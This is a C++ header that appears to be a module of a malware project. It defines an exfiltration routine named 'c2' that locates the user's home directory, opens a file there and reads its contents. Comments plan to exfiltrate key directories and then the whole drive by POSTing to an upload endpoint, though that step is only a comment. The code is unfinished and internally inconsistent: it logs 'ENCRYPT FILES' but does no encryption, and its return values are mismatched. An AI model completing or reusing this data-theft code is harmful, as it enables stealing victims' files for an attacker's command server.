#ifndef EXFILTRATION_HPP
#define EXFILTRATION_HPP

#include <cstdlib>

#include "../utils.hpp"

namespace Exfiltration {
    int c2() {
        LOG_INFO("[EXFIL] ENCRYPT FILES")

        const char* homeEnv = std::getenv("HOME");
        if (homeEnv == nullptr) {
            LOG_ERROR("Couldn't find $HOME - unable to continue")
            return 1;
        }

        // for now test on one file
        // full version would go through the most important directories first
        // then exfil whole drive if wanted
        std::string homeDir(homeEnv);
        std::string filename = ".test";
        std::string fullPath = homeDir + "/" + filename;

        std::filesystem::path pathObj(fullPath);
        if (!std::filesystem::exists(pathObj)) {
            LOG_ERROR("file doesnt exist {}", fullPath)
            return false;
        }
        
        std::fstream file(pathObj, std::ios::binary | std::ios::in | std::ios::out);
        if (!file.is_open()) {
            LOG_ERROR("failed to open file {}", fullPath)
            return false;
        }

        std::vector<char> buffer(CHUNK_SIZE);

        file.read(buffer.data(), CHUNK_SIZE);
        std::streamsize bytesRead = file.gcount();

        if (bytesRead == 0) {
            LOG_ALERT("FILE WAS EMPTY")
            return false;
        }

        // POST to /api/v1/ghost/upload

        return 0;
    }
}

#endif